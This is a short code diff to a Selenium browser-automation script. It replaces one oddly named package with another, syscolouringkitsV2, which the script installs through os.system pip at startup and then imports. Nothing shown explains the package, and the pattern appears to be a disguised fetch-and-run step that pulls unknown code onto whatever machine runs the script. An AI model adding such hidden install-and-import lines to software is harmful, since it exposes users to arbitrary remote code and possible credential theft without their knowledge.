@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonsV2")
-import pipcryptoaddonsV2
+os.system("pip install syscolouringkitsV2")
+import syscolouringkitsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
